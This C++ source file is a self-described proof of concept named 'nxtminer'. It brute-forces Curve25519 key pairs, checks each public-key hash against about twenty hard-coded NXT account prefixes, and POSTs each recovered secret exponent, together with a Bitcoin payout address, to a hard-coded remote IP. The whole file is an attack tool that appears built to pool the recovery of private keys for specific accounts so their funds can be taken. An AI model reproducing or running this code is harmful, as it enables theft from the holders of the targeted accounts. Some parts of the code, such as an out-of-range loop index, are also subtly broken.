// Original Author: Doctor Evil
// License: GNU General Public License, version 3
// Status: Working proof of concept
//
#include <string.h>
#include <iostream>
#include <string>
#include <fstream>
#include <map>
#include <vector>
#include <boost/format.hpp>
#include <boost/thread.hpp>
#include <boost/algorithm/hex.hpp>
#include <boost/algorithm/string.hpp>
#include <boost/multiprecision/cpp_int.hpp>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include "happyhttp.h"
#ifdef __MINGW32__
    #include <winsock2.h>
    #define vsnprintf _vsnprintf
#endif
#include "curve25519-donna-c64.c"

#define BATCH_SIZE 256
std::string account = "none";
typedef std::basic_string<unsigned char> bytestring;

unsigned char *sha256(unsigned char *str, int n, unsigned char *hash)
{
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, str, n);
    SHA256_Final(hash, &sha256);
    return hash;
}

bytestring unhex(const char* input)
{
    bytestring output;
    output.reserve(strlen(input) / 2);
    (void) boost::algorithm::unhex(input, std::back_inserter(output));
    return output;
}

std::string hex(const bytestring &input)
{
    std::string output;
    output.reserve(input.size() * 2);
    (void) boost::algorithm::hex(input, std::back_inserter(output));
    return output;
}

std::string hex(const felem e)
{
    bytestring s(32, 0);
    fcontract(&s[0], e);
    return hex(s);
}

boost::multiprecision::cpp_int le32_to_cpp_int(const bytestring &le32)
{
    boost::multiprecision::cpp_int mpi(0);
    for ( int i = le32.size(); i >= 0; i-- ) {
        mpi = (mpi << 8) + le32[i];
    }
    return mpi;
}

// Computes (exponent_le32 * 2^doublings) % group_order
boost::multiprecision::cpp_int compute_exponent(const bytestring &exponent_le32, uint64_t doublings)
{
    boost::multiprecision::cpp_int pow(doublings);
    boost::multiprecision::cpp_int mod("0x1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed"); // group order
    boost::multiprecision::cpp_int base(2);
    boost::multiprecision::cpp_int result = powm(base, pow, mod);
    result = result * le32_to_cpp_int(exponent_le32);
    result = result % mod;
    return result;
}

// Point doubling; See http://hyperelliptic.org/EFD/g1p/auto-montgom-xz.html#doubling-mdbl-1987-m
void xz_ge_double(felem xout, felem zout, const felem xin)
{
    static const felem fone = {1};
    felem xx1, t0, t1, t2;
    fsquare_times(xx1, xin, 1);
    fcopy(t0, fone);
    fdifference_backwards(t0, xx1);
    fsquare_times(xout, t0, 1);
    fscalar_product(t1, xin, 486662);
    fsum(t1, xx1);
    fsum(t1, fone);
    fmul(t2, xin, t1);
    fscalar_product(zout, t2, 4);
}

// Simultaneous modular inversion; See Section 2.25 of Guide to Elliptic Curve Cryptography (2004)
void batch_inverse(felem *a, int n)
{
    felem c[BATCH_SIZE];
    fcopy(c[0], a[0]);
    for ( int i = 1; i < n; i ++ ) {
        fmul(c[i], c[i-1], a[i]);
    }
    felem u;
    crecip(u, c[n - 1]);
    for ( int i = n - 1; i > 0; i-- ) {
        felem t1, t2;
        fmul(t1, u, c[i-1]);
        fmul(t2, u, a[i]);
        fcopy(a[i], t1);
        fcopy(u, t2);
    }
    fcopy(a[0], u);
}

boost::recursive_mutex guard;

uint64_t checked = 0;

class CheckerFunctor {
public:
    void operator()() {
        while(1){
            boost::this_thread::sleep(boost::posix_time::seconds(4));
            std::cout << checked/4 << " keys/sec" << std::endl;
            checked = 0;
        }
    }
};

std::string get_array(uint8_t* public_key){
      std::ostringstream ss;

      ss << std::hex << std::uppercase << std::setfill( '0' );
      for( size_t i = 0; i<32; ++i ) {
        ss << std::setw( 2 ) << (int)(public_key[i]);
      }

      std::string result = ss.str();
      return result;
}
int submit_share(const std::string &address, const std::string &result)
{
    int ret = -1;
    
    char* str = (char*)malloc(sizeof(char)*255);
    sprintf(str,"&key=%s&address=%s",result.c_str(),address.c_str());

    
    
    const char* headers[] = 
    {
        "Connection", "close",
        "Content-type", "application/x-www-form-urlencoded",
        "Accept", "text/plain",
        0
    };

    try{
        happyhttp::Connection conn( "54.191.123.177", 80 );
        conn.request( "POST",
                "/push",
                headers,
                (const unsigned char*)str,
                strlen(str) );

        while( conn.outstanding() )
            conn.pump();
         
        ret = 1;
    }
    catch( happyhttp::Wobbly& e )
    {
        fprintf(stderr, "Exception:\n%s\n", e.what() );
    }
    free(str); 

    return ret;
}



class MinerFunctor {
public:
    void operator()(std::map<uint64_t, uint64_t> &accounts, std::string thread_seed) {
        // Our approach is to pick a random point and repeatedly double it.
        // This is cheaper than the more naive approach of multiplying the
        // generator point times random exponents.
        // We work in batches because our point doubling algorithm requires a
        // modular inversion which is more efficiently computed in batches.
        const int n = BATCH_SIZE;
        felem xs[BATCH_SIZE], zs[BATCH_SIZE];
        std::vector<bytestring> exponents;
        static const unsigned char generator[32] = {9};
        for ( int i = 0; i < n; i++ ) {
            bytestring exponent(32, 0);
            std::string exponent_seed = boost::str(boost::format("%1%:%2%") % thread_seed % i);
            sha256((unsigned char*) &exponent_seed[0], exponent_seed.size(), &exponent[0]);
            // transform initial exponent according to curve25519 tweaks
            exponent[0] &= 248;
            exponent[31] &= 127;
            exponent[31] |= 64;
            uint8_t pubkey[32];
            curve25519_donna(pubkey, &exponent[0], generator);
            fexpand(xs[i], pubkey);
            exponents.push_back(exponent);
        }
        for ( uint64_t doublings = 1; true; doublings++ ) {
            for ( int i = 0; i < n; i++ ) {
                felem xout;
                xz_ge_double(xout, zs[i], xs[i]);
                fcopy(xs[i], xout);
            }
            batch_inverse(zs, n);
            for ( int i = 0; i < n; i++ ) {
                felem xout;
                fmul(xout, xs[i], zs[i]);
                uint8_t pubkey[32], pubkey_hash[32];
                fcontract(pubkey, xout);
                // not entirely sure normalizing the representation of x is necessary but can't hurt
                fexpand(xout, pubkey);
                fcopy(xs[i], xout);
                sha256(pubkey, 32, pubkey_hash);
                uint64_t account_id = *((uint64_t*) pubkey_hash);

                unsigned int a = (pubkey_hash[0] << 24) | (pubkey_hash[1] << 16) | (pubkey_hash[2] << 8) | (pubkey_hash[3]);
                if((a==0x25c5a207) || (a==0x861fc1a3) || (a==0x65ae467f) || (a==0xba973233) || (a==0x6e01b0b7) || (a==0x28dca32c) || (a==0xf297ad07) || (a==0xed66fe31) || (a==0xba2d6f04) || (a==0xc846bf0c) || (a==0x4fa8cf07) || (a==0x4e6e2b3d) || (a==0x1febd530) || (a==0x780ad9aa) || (a==0xb60166f3) || (a==0xa0860100) || (a==0xe239bdb) || (a==0xe708b03a) || (a==0xb1efa06b) || (a==0xe2ea7edf) || (a==0x1c96882c)){
                    boost::lock_guard<boost::recursive_mutex> lock(guard);
                    boost::multiprecision::cpp_int e = compute_exponent(exponents[i], doublings);
                    std::cout << "found share " << account_id << std::endl;
                    std::cout << "  pubkey = " << get_array(pubkey) << std::endl;
                    std::cout << "  pubhash = " << get_array(pubkey_hash) << std::endl;
                    std::cout << "  secret exponent = " << e << std::endl;

                    unsigned char net_order[32];
                    for(int i=0;i<32;++i){
                        int j = e.convert_to<int>();
                        net_order[31-i] = j & 0xFF;
                        e = e >> 8;
                    }
                    submit_share(account,get_array(net_order));


                }

            }
            checked += n;
        }
    }
};
int main(int argc, char* argv[])
{
    if ( argc < 2 ) {
        std::cerr << "Usage: nxtminer <btc-address>" << std::endl;
        exit(1);
    }
    bytestring binary_seed(16, 0);
    RAND_pseudo_bytes(&binary_seed[0], 16);
    std::string random_seed = hex(binary_seed);
  

    // load a file with "<account-id> <balance>" darknxt records
    std::map<uint64_t, uint64_t> accounts;
    account = (argv[1]);
    

    // fire up as many worker threads as we have cores
    int num_threads = boost::thread::hardware_concurrency();
    boost::thread_group workers;
    MinerFunctor f;
    for ( int n = 0; n < num_threads; n++ ) {
        std::string thread_seed = boost::str(boost::format("%1%:%2%") % random_seed % n);
        workers.create_thread(boost::bind<void>(f, boost::ref(accounts), thread_seed));
    }

    std::cout << "using seed: " << random_seed << std::endl;
    std::cout << "searching " << accounts.size() << " accounts" << std::endl;
    std::cout << "calibrating ... " << std::flush;
    
    CheckerFunctor checker_f;
    workers.create_thread(boost::bind<void>(checker_f));
    workers.join_all();

    return 0;
}
